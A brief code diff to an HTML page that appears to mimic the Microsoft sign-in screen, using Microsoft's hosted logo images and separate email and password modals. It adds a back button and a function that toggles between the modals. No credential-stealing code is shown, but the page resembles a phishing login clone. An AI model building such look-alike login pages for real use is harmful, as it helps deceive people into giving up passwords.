@@ -234,7 +234,7 @@ span.psw {
             <img src="https://logincdn.msauth.net/16.000.28345.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" alt=""> 
             <br><br>
             <div class="passwordmodalemail">
-            <button><img src="https://logincdn.msauth.net/16.000.28345.6/images/arrow_left.png?x=7cc096da6aa2dba3f81fcc1c8262157c" alt=""></button>
+            <button onclick="loginback()"><img src="https://logincdn.msauth.net/16.000.28345.6/images/arrow_left.png?x=7cc096da6aa2dba3f81fcc1c8262157c" alt=""></button>
             <p id="emailaddress"></p>
             </div>
            <br>
@@ -273,7 +273,12 @@ function nextBtn(){
 document.getElementById("loginvaladitionmsg").style.display = "block";
 }
 
+}function loginback(){
+    modal.style.display = "block";
+    passmodal.style.display = "none";
 }
+
+
 </script>
 
 </body>
